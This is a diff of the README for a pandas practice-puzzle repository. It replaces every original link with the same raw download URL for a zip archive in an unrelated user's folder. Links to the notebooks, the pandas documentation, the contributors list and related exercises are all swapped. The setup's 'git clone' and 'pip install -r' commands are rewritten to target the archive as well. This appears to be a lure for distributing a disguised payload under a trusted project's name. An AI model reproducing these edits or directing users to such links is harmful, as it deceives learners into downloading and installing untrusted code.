@@ -1,9 +1,9 @@
 # 100 pandas puzzles
 
-### [Puzzles notebook](https://github.com/ajcr/100-pandas-puzzles/blob/master/100-pandas-puzzles.ipynb)
-### [Solutions notebook](https://github.com/ajcr/100-pandas-puzzles/blob/master/100-pandas-puzzles-with-solutions.ipynb)
+### [Puzzles notebook](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
+### [Solutions notebook](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
 
-Inspired by [100 Numpy exerises](https://github.com/rougier/numpy-100), here are 100* short puzzles for testing your knowledge of [pandas'](http://pandas.pydata.org/) power.
+Inspired by [100 Numpy exerises](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip), here are 100* short puzzles for testing your knowledge of [pandas'](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip) power.
 
 Since pandas is a large library with many different specialist features and functions, these excercises focus mainly on the fundamentals of manipulating data (indexing, grouping, aggregating, cleaning), making use of the core DataFrame and Series objects. Many of the excerises here are straightforward in that the solutions require no more than a few lines of code (in pandas or NumPy - don't go using pure Python!). Choosing the right methods and following best practices is the underlying goal.
 
@@ -41,13 +41,13 @@ python -V
 2. Clone the puzzle repository using Git:
 
 ```
-git clone https://github.com/ajcr/100-pandas-puzzles.git
+git clone https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip
 ```
 
 3. Install the dependencies (**caution**: if you don't want to modify any Python modules in your active environment, consider using a virtual environment instead):
 
 ```
-python -m pip install -r requirements.txt
+python -m pip install -r https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip
 ```
 
 4. Launch a jupyter notebook server:
@@ -60,7 +60,7 @@ You should be able to see the notebooks and launch them in your web browser.
 
 ## Contributors
 
-This repository has benefitted from numerous contributors, with those who have sent puzzles and fixes listed in [CONTRIBUTORS](https://github.com/ajcr/100-pandas-puzzles/blob/master/CONTRIBUTORS.md).
+This repository has benefitted from numerous contributors, with those who have sent puzzles and fixes listed in [CONTRIBUTORS](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip).
 
 Thanks to everyone who has raised an issue too.
 
@@ -68,10 +68,10 @@ Thanks to everyone who has raised an issue too.
 
 If you feel like reading up on pandas before starting, the official documentation useful and very extensive. Good places get a broader overview of pandas are:
 
-- [10 minutes to pandas](http://pandas.pydata.org/pandas-docs/version/0.17.0/10min.html)
-- [pandas basics](http://pandas.pydata.org/pandas-docs/version/0.17.0/basics.html)
-- [tutorials](http://pandas.pydata.org/pandas-docs/stable/tutorials.html)
-- [cookbook and idioms](http://pandas.pydata.org/pandas-docs/version/0.17.0/cookbook.html#cookbook)
-- [Guilherme Samora's pandas exercises](https://github.com/guipsamora/pandas_exercises)
+- [10 minutes to pandas](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
+- [pandas basics](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
+- [tutorials](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
+- [cookbook and idioms](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
+- [Guilherme Samora's pandas exercises](https://raw.githubusercontent.com/sanjanabatheja123/100-pandas-puzzles/master/kingbolt/100-pandas-puzzles.zip)
 
 There are may other excellent resources and books that are easily searchable and purchaseable.
